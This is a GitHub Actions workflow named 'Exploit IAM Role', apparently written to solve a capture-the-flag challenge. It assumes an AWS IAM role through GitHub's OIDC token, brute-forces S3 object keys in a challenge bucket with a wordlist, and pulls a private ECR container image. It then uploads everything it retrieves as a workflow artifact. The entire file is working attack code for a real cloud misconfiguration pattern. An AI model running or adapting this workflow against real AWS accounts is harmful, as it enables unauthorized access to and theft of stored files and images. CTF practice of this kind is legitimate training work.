name: Exploit IAM Role
on:
  push:
    branches: [ "main", "2025-*" ]
permissions:
  id-token: write
  contents: read
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1
          role-session-name: ctf-session
      - name: Debug Role
        run: |
          aws sts get-caller-identity
          echo "Testing S3 permissions..."
          aws s3api get-object --bucket challenge-assets-production-empasoft-ctf --key forensic/imaginary-challenge/docker-image.tar /tmp/test.tar 2>/dev/null || echo "GetObject failed for docker-image.tar"
      - name: Try S3 Files
        run: |
          echo "Trying common S3 paths..."
          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/flag.txt /tmp/flag.txt 2>/dev/null && echo "Downloaded: flag.txt"
          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/encrypted_flag.txt /tmp/encrypted_flag.txt 2>/dev/null && echo "Downloaded: encrypted_flag.txt"
          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/image.tar /tmp/image.tar 2>/dev/null && echo "Downloaded: image.tar"
          echo "Trying wordlist S3 paths..."
          for word in $(cat wordlist.txt); do
            aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/docker-image-$word.tar /tmp/image-$word.tar 2>/dev/null && echo "Downloaded: docker-image-$word.tar" && exit 0
            aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/$word.tar /tmp/image-$word.tar 2>/dev/null && echo "Downloaded: $word.tar" && exit 0
            aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/$word.txt /tmp/$word.txt 2>/dev/null && echo "Downloaded: $word.txt" && exit 0
          done
          echo "No S3 files found."
      - name: Try ECR
        run: |
          echo "Trying ECR registry..."
          aws ecr get-login-password --region ap-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com 2>/dev/null
          docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/imaginary-challenge:latest 2>/dev/null && docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/imaginary-challenge:latest -o /tmp/artifacts/image.tar && echo "Downloaded ECR image."
      - name: Save and Upload Artifact
        run: |
          mkdir -p /tmp/artifacts
          mv /tmp/image*.tar /tmp/*.txt /tmp/artifacts/ 2>/dev/null || echo "No files to move."
          ls -l /tmp/artifacts/
      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: ctf-files
          path: /tmp/artifacts/
          if-no-files-found: warn
